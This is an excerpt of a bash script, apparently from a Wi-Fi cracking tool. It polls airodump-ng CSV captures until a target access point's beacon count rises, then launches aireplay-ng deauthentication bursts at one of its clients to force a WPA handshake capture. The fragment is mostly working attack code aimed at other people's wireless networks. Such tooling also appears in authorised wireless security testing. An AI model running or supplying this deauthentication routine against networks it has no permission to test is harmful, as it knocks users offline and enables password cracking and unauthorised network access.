...
varbeacon='1'
varcheck1='1'
sptime="$(cat attacktime.txt)"
fi

## ## ATTACKBEACON ## ##
while [ "$varbeacon" -gt "$varcheck1" ]; do
  echo "Beacon under -> '$(cat attackbeacon.txt)' !!! (checking again after -> 1m)"
  echo " "
  sleep 1m
  varcheck1="$(grep $(cat macadress.txt) $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-[0-9][0-9].csv | tail -1) | cut -d ',' -f 10 | sed 's/[ ]//g;1!d')"
done
...
xterm -geometry "65x25+0+0" -e "sleep $sptime && aireplay-ng -0 8 -a $(cat macadress.txt) -c $(grep 'Client' $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-[0-9][0-9].log.csv | tail -1) | cut -d ',' -f 4 | perl -ne 'print if ++$k{$_}==1' | tail -1) $(cat interface.txt)"
